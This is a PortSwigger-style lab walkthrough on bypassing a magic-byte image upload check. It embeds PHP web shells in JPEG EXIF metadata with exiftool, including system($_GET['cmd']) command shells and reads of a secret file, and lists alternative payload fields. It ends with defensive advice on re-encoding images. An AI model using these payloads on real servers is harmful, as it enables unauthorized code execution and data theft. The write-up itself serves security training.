1. What is a Polyglot Web Shell?

Core Concept

This lab’s validation is a real step up from anything in the earlier labs. Uploading shell.php doesn’t just get rejected on filename or Content-Type grounds — the error message itself is different in character, hinting that the server is actually looking inside the file. It’s checking the file’s magic bytes: the first few bytes of a file, which for well-known formats are a fixed, predictable signature. A real JPEG always starts with the hex sequence FF D8 FF; a real PNG always starts with 89 50 4E 47. A plain-text PHP file starts with <?php, which obviously matches neither — so the server can tell, correctly, that this “image” isn’t one at all.

The catch: magic bytes only need to be present at the start of the file. Nothing says the rest of the file has to be nothing but pristine, unmodified image data. Image formats like JPEG have well-defined regions for metadata — EXIF fields like camera model, GPS coordinates, and a free-text “Comment” field, all embedded inside an otherwise completely valid image. If you take a real, genuine JPEG and stuff PHP code into its Comment field, the file starts with valid JPEG magic bytes (satisfying the check), and is a fully valid, openable JPEG image in every practical sense — but somewhere inside it, buried in metadata a strict validator doesn’t care about, sits your PHP payload as plain text. This dual-nature file is called a polyglot: simultaneously a real image and a script.

The oracle here is that “is this a valid image” and “does this file only contain image data and nothing else” are two very different questions — a magic-byte check answers the first, but a polyglot file is specifically engineered to make the answer to the first “yes” while quietly smuggling something else entirely into the parts of the file format that were never meant to be checked.

2. Attack Overview & Key Concepts

Vulnerability Explanation

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret.

  • Provided Credentials: wiener:peter
  • What Changed From Earlier Labs: The rejection message and behavior are noticeably different from a simple filename or Content-Type check — this app is genuinely inspecting file content, specifically the magic bytes at the start of the file, to confirm it’s a real image.
  • The Bypass Tool: ExifTool — a widely-used, free command-line utility for reading and writing image metadata, which happens to be perfect for embedding a PHP payload into a genuine image’s metadata without corrupting the image itself.
  • End Goal: Get PHP code executing on the server, use it to read /home/carlos/secret, and submit the contents.

Root Cause & Impact

The root cause is that this validation checks a necessary but not sufficient condition for safety. Confirming a file starts with a real image signature tells you it genuinely is a parseable image — but it says nothing about whether additional, non-image content has also been smuggled in elsewhere in the file, particularly inside metadata fields that image formats are specifically designed to allow arbitrary user-supplied text in. Combined with the same fundamental issue as every lab in this module — the file still gets stored with script-executable permissions in a directory the web server will run PHP from — a magic-byte check alone is nowhere near sufficient to prevent a malicious upload.

3. Attack Methods & Techniques (What I Tried, and What Actually Worked)

First move — the usual plain PHP file. Uploading shell.php directly. Rejected, as expected by now — but the specific error wording is worth reading carefully, since it can hint at what is being checked rather than just that something is being checked.

Testing whether it’s really content-based, not just filename-based. Trying the trick that solved Lab #5 — renaming the plain PHP file to something like shell.php.jpg, or applying the null byte technique. Neither works here the same way, or if the upload is accepted, visiting the resulting file doesn’t execute as PHP — a strong signal this app’s check goes deeper than just the filename string this time, and is genuinely reading file bytes.

Confirming the magic-byte theory. Uploading a real, unmodified .jpg image (renamed to .php, just to see what happens) — if the server is only checking the extension, this should still be rejected as looking like a PHP file by name; if it’s checking actual content, a genuine JPEG’s real bytes might sail through even with a .php extension, which is a meaningful clue about exactly what layer of validation is in play.

Building the polyglot. Since a real image’s magic bytes need to survive intact, the shell itself has to be layered into a real image rather than built from scratch as plain text. ExifTool is the standard tool for this — it can write arbitrary text into an image’s metadata fields (like the Comment field) without disturbing the image’s actual pixel data or its header/magic bytes at all. Running:

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" avatar.jpg -o polyglot.php

This takes a real avatar.jpg, injects the PHP payload into its Comment metadata field, and outputs the result directly as polyglot.php — so the final file already has the extension needed for the server to treat it as PHP, while its actual byte content still opens as a legitimate JPEG.

Uploading and confirming. Uploading polyglot.php through the normal avatar form. This time it’s accepted — the magic bytes check out, since the underlying image data is completely genuine. Visiting the uploaded file’s URL directly returns the executed PHP output, sandwiched between the START and END markers deliberately included in the payload to make the leaked secret easy to spot amid whatever other raw image/metadata bytes also get echoed in the response.

Server Behavior

  • Uploading shell.php (plain PHP, no image data at all): Rejected — the file’s magic bytes don’t match any recognized image format.
  • Uploading a real .jpg renamed to .php (no PHP payload, just a genuine image with a misleading extension): Accepted by the content check (it IS a real image), but harmless — there’s no PHP code inside it to execute.
  • Uploading polyglot.php (real JPEG magic bytes and structure, PHP payload embedded in the Comment metadata field, saved with a .php extension): Accepted — the magic byte check passes because the file genuinely starts with valid JPEG data, and the embedded PHP payload sits further into the file, in a region the validator never inspects.
  • Requesting the uploaded polyglot file’s URL directly: The PHP interpreter processes the entire file, finds and executes the <?php ... ?> block embedded in the metadata, and the response includes both the executed script’s output and whatever raw image/metadata bytes surround it.

4. Step-by-Step Walkthrough

Step 1: Confirm Content-Based Validation Is in Play

  1. Log in with wiener:peter and go to “My account.”
  2. Attempt to upload a plain shell.php file containing:
<?php echo file_get_contents('/home/carlos/secret'); ?>
  1. Observation: Rejected. Compare this rejection’s wording/behavior against earlier labs if possible — a content-based check often behaves differently from a simple extension or Content-Type check (for example, it may reject files that pass a Content-Type spoof, unlike Lab #2).

Step 2: Install ExifTool

  1. If not already installed, download and install ExifTool from its official site (exiftool.org), or via your package manager (e.g. apt install libimage-exiftool-perl on Debian/Ubuntu, brew install exiftool on macOS).
  2. Confirm it’s working by running exiftool -ver in your terminal — it should print a version number.

Step 3: Obtain a Genuine Image to Use as the Base

  1. Use any real .jpg or .png image file you have available — it doesn’t need to be anything special, just a genuine, unmodified, valid image. Save it locally, e.g. as avatar.jpg.

Step 4: Inject the PHP Payload into the Image’s Metadata

  1. Open a terminal in the same directory as your image file.
  2. Run the following command:
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" avatar.jpg -o polyglot.php
  1. Breaking this down:
    • -Comment="..." writes the given text into the image’s EXIF Comment metadata field.
    • The PHP payload itself reads the target secret file and wraps its output between the literal strings START and END, making it trivially easy to locate the leaked secret inside a larger, messier HTTP response later.
    • avatar.jpg is the genuine input image.
    • -o polyglot.php tells ExifTool to write the result to a new file, directly using the .php extension you’ll need for the server to treat it as executable PHP.
  2. Result: A new file, polyglot.php, now exists — structurally a completely valid JPEG (magic bytes, image data, and all), but with your PHP payload embedded as plain text inside its Comment metadata field.

Step 5: Upload the Polyglot File

  1. Back on the “My account” page, use the avatar upload field to select and upload polyglot.php.
  2. Result: The upload succeeds — the file’s magic bytes genuinely match a real JPEG, satisfying the content-based validation check.

Step 6: Find the Uploaded File’s URL

  1. Check Burp’s Proxy → HTTP history, or reload the account page and inspect the (likely broken-looking, since it’s not a “normal” JPEG anymore once PHP has run on it) avatar image’s URL.
  2. This will typically look like:
https://[LAB-ID].web-security-academy.net/files/avatars/polyglot.php

Step 7: Trigger Execution and Extract the Secret

  1. Visit this URL directly in your browser, or send a GET request to it via Burp Repeater.
  2. Result: The response contains a mix of raw image/metadata bytes and the executed PHP output. Look for the literal text START and END in the response body — the content between them is the actual contents of /home/carlos/secret.

Step 8: Submit the Solution

  1. Copy the secret string found between the START and END markers.
  2. Click the lab banner’s “Submit solution” button, paste the secret, and submit.
  3. The lab banner updates to “Congratulations, you solved the lab!”.

5. Different Ways to Exploit This (Alternative Methods & Payloads)

Embedding the payload in different EXIF fields, in case the Comment field specifically gets stripped or sanitized:

exiftool "-Artist=<?php echo file_get_contents('/home/carlos/secret'); ?>" avatar.jpg -o polyglot.php
exiftool "-ImageDescription=<?php system($_GET['cmd']); ?>" avatar.jpg -o polyglot.php

Different metadata fields (Artist, ImageDescription, Copyright, etc.) can serve the exact same purpose — worth having a couple of alternates ready in case a particular field is specially handled or scrubbed by image-processing libraries on the server side.

Manually constructing a polyglot without ExifTool, for environments where installing it isn’t an option:

Some image formats’ comment sections can be edited directly with a hex editor or even a plain text editor if you know the format’s structure precisely — for JPEG specifically, appending PHP code after the End-Of-Image (FF D9) marker, or into a COM segment, can also work in many configurations, since some PHP-handling web servers will still parse and execute PHP tags found anywhere in a file, not just at the very beginning.

Using a general-purpose command shell instead of the single-file-read payload, exactly as in earlier labs:

exiftool -Comment="<?php system(\$_GET['cmd']); ?>" avatar.jpg -o polyglot.php

Then interact via:

GET /files/avatars/polyglot.php?cmd=id
GET /files/avatars/polyglot.php?cmd=cat+/home/carlos/secret

Useful when more than a single file read is needed during a real assessment.

Checking image thumbnails/EXIF data with a simple viewer first, to confirm your polyglot didn’t corrupt the image, using ExifTool’s own read mode:

exiftool polyglot.php

Running ExifTool against your own crafted file (without the -Comment= write flag) lets you review all embedded metadata fields, confirming your payload landed exactly where intended and that the file’s core image structure remains intact — useful as a sanity check before uploading.

Using an online or GUI-based EXIF editor as an alternative to the command line, for anyone less comfortable with terminal tools — numerous free EXIF editing tools and browser extensions provide the same Comment/metadata-editing capability as ExifTool, though the command-line approach is generally faster and more scriptable for repeated testing.

6. If This Existed in the Real World

Polyglot files exploiting the gap between “passes magic-byte/format validation” and “contains nothing else” are a well-documented, actively-used real-world technique:

  • Real-world WAF and antivirus evasion: Malware authors have long used polyglot files — combining valid PDF, JPEG, or ZIP structures with embedded executable payloads — specifically to evade security scanners that only check a file’s leading signature or perform shallow format validation, rather than fully parsing every region of the file.
  • CVE-documented image-processing library vulnerabilities: Beyond just metadata injection, real vulnerabilities have been found in specific image libraries (ImageMagick’s infamous “ImageTragick” vulnerability being a well-known example) where specially crafted image files—valid by format, but containing malicious embedded instructions—achieved remote code execution during server-side image processing itself, a related but distinct real-world consequence of the same “images can contain more than pixels” principle.
  • EXIF-based cross-site scripting and log injection: Even without achieving full RCE, EXIF metadata fields have been used in real bug bounty reports to inject XSS payloads or log-injection strings into applications that display uploaded images’ metadata back to other users without proper sanitization — the same “metadata fields are attacker-controlled free text” insight this lab teaches, applied to a different vulnerability class entirely.

7. Pro-Tips & Common Pitfalls

  • Always use a genuinely valid base image, not a fake or corrupted one. The entire technique depends on the file’s magic bytes and overall structure being real and intact — starting from an already-broken or non-standard image file risks the magic-byte check failing regardless of your payload injection.
  • Wrap your leaked data in clear markers (START/END or similar). The HTTP response for a polyglot file will contain a mix of raw binary/metadata bytes alongside your script’s actual output — without clear delimiters, finding your target data inside that noise is far more tedious than it needs to be.
  • Verify your polyglot with ExifTool’s read mode before uploading, to catch mistakes early rather than debugging a failed upload blind.
  • Different image formats have different metadata capabilities — JPEG’s EXIF Comment field is a common, reliable choice, but PNG has its own metadata chunk system (tEXt, zTXt chunks) that ExifTool can also write to, worth knowing if a target specifically expects PNG uploads rather than JPEG.
  • The vulnerable backend pattern:
// ❌ VULNERABLE — only checks that the file's leading bytes match a
// known image signature, without verifying the file contains nothing else
function isValidImage($filePath) {
    $handle = fopen($filePath, 'rb');
    $bytes = fread($handle, 4);
    fclose($handle);
    return bin2hex($bytes) === 'ffd8ffe0'; // JPEG magic bytes only
}
// A polyglot file passes this check trivially, since its magic bytes are genuine

// ✅ SAFE — fully re-encode/re-process the image server-side (stripping all
// metadata) using a trusted image library, rather than just checking magic bytes
$image = imagecreatefromjpeg($uploadedFilePath);
imagejpeg($image, $safeOutputPath); // produces a clean image with NO original metadata
imagedestroy($image);
  • Prevention summary:
    • Never rely on magic-byte checks alone — they only confirm a file starts like a real image, not that it contains nothing but image data.
    • Fully re-encode uploaded images server-side using a trusted image-processing library (which strips all metadata and regenerates clean pixel data in the process) rather than simply validating and passing through the original uploaded bytes.
    • Store re-processed images in a directory with script execution disabled, as defense-in-depth even if a polyglot somehow survives re-encoding.
    • Treat EXIF and other metadata fields as untrusted, attacker-controlled input anywhere they’re read, displayed, or processed by the application — not just in the context of file upload validation.
